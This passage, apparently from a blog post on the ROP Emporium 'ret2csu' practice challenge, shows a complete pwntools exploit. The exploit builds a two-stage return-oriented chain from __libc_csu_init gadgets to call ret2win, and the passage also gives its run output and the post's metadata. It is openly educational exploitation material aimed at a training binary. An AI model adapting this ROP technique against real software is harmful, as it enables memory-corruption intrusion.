punctuation\",children:\".\"}),\"context\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"encoding \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(a.span,{className:\"token string\",children:'\"latin-1\"'}),` \n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"warnings\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"simplefilter\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token string\",children:'\"ignore\"'}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"arch \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(a.span,{className:\"token string\",children:'\"amd64\"'}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"io \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"process\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token string\",children:\"'./ret2csu'\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token comment\",children:\"#arguments passed to ret2win function ret2win(arg1, arg2, arg3)\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"arg1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0xdeadbeefdeadbeef\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"arg2 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0xcafebabecafebabe\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"arg3 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd00df00dd00df00d\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"ret2win_addr \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"elf\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"plt\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token string\",children:\"'ret2win'\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#resolve address of ret2win function\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pop_rbx_rbp_r12_r13_r14_r15_addr \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0040069a\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#first stage gadget\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"dereference_pointer \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00600e48\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#bss area which is executable\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage2_addr \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00400680\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#addr of second stage rop chain\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pop_rdi \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x004006a3\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token comment\",children:\"# ropchains\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token comment\",children:\"#stage1 ropchain\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`'''\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`            0x0040069a      pop   rbx\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502           0x0040069b      pop   rbp\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502           0x0040069c      pop   r12\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502           0x0040069e      pop   r13\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502           0x004006a0      pop   r14\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502           0x004006a2      pop   r15\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2514           0x004006a4      ret\n`})}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:\"'''\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token comment\",children:\"#Determine the loop values for conditional branch\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`'''\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u254E\\u2502          0x00400689      call  qword [r12 + rbx*8]\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u254E\\u2502   0x0040068d      add   rbx, 1\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u254E\\u2502   0x00400691      cmp   rbp, rbx\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u2514\\u2500\\u2500\u003c 0x00400694      jne   0x400680\n`})}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:\"'''\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),` pop_rbx_rbp_r12_r13_r14_r15_addr\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#set RBP=0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),\"   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#set RBX=1\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" dereference_pointer \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#set R12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" arg1   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#R13\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" arg2   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#R14\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" arg3   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#R15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),` stage2_addr\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage1 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"7\"}),\"   \",(0,e.jsx)(a.span,{className:\"token comment\",children:\"#adjust the stack\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token comment\",children:\"#stage2\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`'''\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`   \\u250C\\u2500\\u2500\u003e     0x00400680      mov   rdx, r15\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u254E\\u2502   0x00400683      mov   rsi, r14\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u254E\\u2502   0x00400686      mov   edi, r13d\n`})}),(0,e.jsx)(a.span,{className:\"code-line\",children:(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:`\\u2502      \\u254E\\u2502   0x00400689      call  qword [r12 + rbx*8]\n`})}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token string triple-quoted-string\",children:\"'''\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage2 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),` pop_rdi\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage2 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),`arg1\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"stage2 \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),`ret2win_addr \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(a.span,{className:\"token string\",children:'b\"A\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(a.span,{className:\"token string\",children:'b\"B\"'}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(a.span,{className:\"token string\",children:'b\"\"'}),\" \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"join\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    stage1\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    stage2\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"io\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"writeafter\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token string\",children:\"'\u003e'\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"recvall\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(a.p,{children:\"Running the exploit code above we get the correct flag\"}),(0,e.jsx)(a.pre,{className:\"language-bash\",children:(0,e.jsxs)(a.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`vx@archie:ret2csu$ python3 xpl.py \n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Starting \",(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\"local\"}),\" process \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'./ret2csu'\"}),(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\":\"}),\" pid \",(0,e.jsx)(a.span,{className:\"token number\",children:\"18869\"}),`\n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    RUNPATH:  b\",(0,e.jsx)(a.span,{className:\"token string\",children:\"'.'\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Receiving all data: Done \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"45B\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\" Process \",(0,e.jsx)(a.span,{className:\"token string\",children:\"'./ret2csu'\"}),\" stopped with \",(0,e.jsx)(a.span,{className:\"token builtin class-name\",children:\"exit\"}),\" code \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"pid \",(0,e.jsx)(a.span,{className:\"token number\",children:\"18869\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"]\"}),\"  Thank you\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    ROPE\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"{\"}),\"a_placeholder_32byte_flag\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"!\"}),(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),(0,e.jsxs)(a.h2,{id:\"references\",children:[(0,e.jsx)(a.a,{href:\"#references\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"References\"]}),(0,e.jsxs)(a.ol,{children:[(0,e.jsx)(a.li,{children:(0,e.jsx)(a.a,{href:\"https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf\",children:\"Universal ROP or Return-to-csu\"})}),(0,e.jsx)(a.li,{children:(0,e.jsx)(a.a,{href:\"http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\",children:\"Linux program startup\"})})]})]})}}var w=f;function _(n,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+n+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return x(y);})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":1},{"value":"pwnme Function Disassembly","url":"#pwnme-function-disassembly","depth":2},{"value":"libc_csu_init Disassembly","url":"#libc_csu_init-disassembly","depth":2},{"value":"Exploit","url":"#exploit","depth":2},{"value":"References","url":"#references","depth":2}],"frontMatter":{"readingTime":{"text":"18 min read","minutes":17.58,"time":1054800,"words":3516},"slug":"ropemporium-ret2csu","fileName":"ropemporium-ret2csu.mdx","title":"Return-Oriented Programming - Ret2csu","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.","image":[],"layout":"PostLayout","canonicalUrl":null}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.54,"time":32400,"words":108},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/avatar.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Return-Oriented Programming - ret2win","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.","images":[],"layout":"PostLayout","slug":"ropemporium-ret2win"},"next":{"title":"Return-Oriented Programming - Callme","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.","layout":"PostLayout","slug":"ropemporium-callme"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["ropemporium-ret2csu"]},"buildId":"WOHMjo6-Jr1hGUuSwf8E-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>